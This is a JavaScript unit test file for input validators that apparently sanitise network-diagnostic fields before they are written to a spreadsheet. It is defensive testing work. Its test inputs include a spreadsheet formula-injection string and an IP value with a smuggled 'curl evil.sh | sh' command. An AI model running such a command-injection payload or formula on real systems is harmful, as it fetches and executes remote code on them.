test('cellSafe neutralises formulas and strips control chars', () => {
  const b = loadBackend();
  assert.strictEqual(b.cellSafe('=IMPORTXML("x")'), "'=IMPORTXML(\"x\")");
  assert.strictEqual(b.cellSafe('+1'), "'+1");
  assert.strictEqual(b.cellSafe('a\u0000b'), 'ab');
  assert.strictEqual(b.cellSafe(''), '—');
  assert.strictEqual(b.cellSafe('x'.repeat(300)).length, 200);
});

test('isValidIp accepts v4/v6 and rejects injection', () => {
  const b = loadBackend();
  assert.ok(b.isValidIp('1.2.3.4'));
  assert.ok(b.isValidIp('2001:db8::1'));
  assert.ok(!b.isValidIp('1.2.3.4; curl evil.sh | sh'));
  assert.ok(!b.isValidIp('256.1.1.1'));
});

test('pickEnum / pickEnumList only allow whitelisted values', () => {
  const b = loadBackend();
  assert.strictEqual(b.pickEnum('wifi', b.ENUMS.networkType), 'wifi');
  assert.strictEqual(b.pickEnum('=1', b.ENUMS.networkType), '—');
  assert.strictEqual(b.pickEnumList(['disconnect', 'x', 'disconnect', 'lag_spike'], b.ENUMS.issueType), 'disconnect, lag_spike');
  assert.strictEqual(b.pickEnumList('disconnect', b.ENUMS.issueType), '—');
});

test('intInRange accepts plain integers only', () => {
  const b = loadBackend();
  assert.strictEqual(b.intInRange(120, 0, 10000), 120);
  assert.strictEqual(b.intInRange('85', 0, 10000), 85);
  assert.strictEqual(b.intInRange('', 0, 10000), '—');
  assert.strictEqual(b.intInRange('1e3', 0, 10000), '—');
  assert.strictEqual(b.intInRange(-1, 0, 10000), '—');
  assert.strictEqual(b.intInRange(101, 0, 100), '—');
});

test('validAsn / validCidr / validColo / validUtcStamp', () => {
  const b = loadBackend();
  assert.strictEqual(b.validAsn('as4766'), 'AS4766');
  assert.strictEqual(b.validAsn('AS4766 KT'), '—');
  assert.strictEqual(b.validCidr('41.92.0.0/17'), '41.92.0.0/17');
  assert.strictEqual(b.validCidr('2001:db8::/32'), '2001:db8::/32');
  assert.strictEqual(b.validCidr('41.92.0.0/33'), '—');
  assert.strictEqual(b.validCidr('=1/2'), '—');
  assert.strictEqual(b.validColo('icn'), 'ICN');
  assert.strictEqual(b.validColo('ICN1'), '—');
  assert.strictEqual(b.validUtcStamp('2026-11-17T13:05Z'), '2026-11-17T13:05Z');
  assert.strictEqual(b.validUtcStamp('2026-11-17 13:05'), '');
});

test('egressText dedupes, validates and caps at 5', () => {
  const b = loadBackend();
  assert.strictEqual(b.egressText(['1.1.1.1', '1.1.1.1']), 'single');
  assert.strictEqual(b.egressText(['1.1.1.1', '2.2.2.2', 'bad']), '1.1.1.1, 2.2.2.2');
  assert.strictEqual(b.egressText([]), '—');
  assert.strictEqual(b.egressText('1.1.1.1'), '—');
});
